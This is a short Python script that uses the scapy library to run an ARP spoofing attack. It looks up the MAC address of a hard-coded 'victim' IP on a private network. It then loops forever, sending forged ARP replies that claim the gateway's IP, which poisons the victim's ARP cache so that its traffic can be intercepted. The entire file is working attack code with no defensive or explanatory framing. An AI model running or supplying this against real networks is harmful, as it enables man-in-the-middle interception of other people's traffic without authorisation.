import scapy.all as scapy

targetMac= None
gatewayIp= "10.100.102.1"
targetIp= "10.100.102.57" 

def getVictimMac(ip):
    arpRequest= scapy.Ether(dst="ff:ff:ff:ff:ff:ff") /scapy.ARP(pdst=ip)
    reply, other= scapy.srp(arpRequest, timeout=3, verbose=0)
    if reply:
        return reply[0][1].src
    return None

def spoof(targetIp, targetMac, spoofIp):
    spoofedArpPacket= scapy.ARP(pdst=targetIp, hwdst=targetMac, psrc=spoofIp, op="is-at")
    scapy.send(spoofedArpPacket, verbose=0)


while not targetMac:
    targetMac= getVictimMac(targetIp)
    if not targetMac:
        print("mac address for victim not found \n")
print("victim mac address is: ".format(targetMac))

while True:
    spoof(targetIp, targetMac, gatewayIp)
    print("spoofing is active")
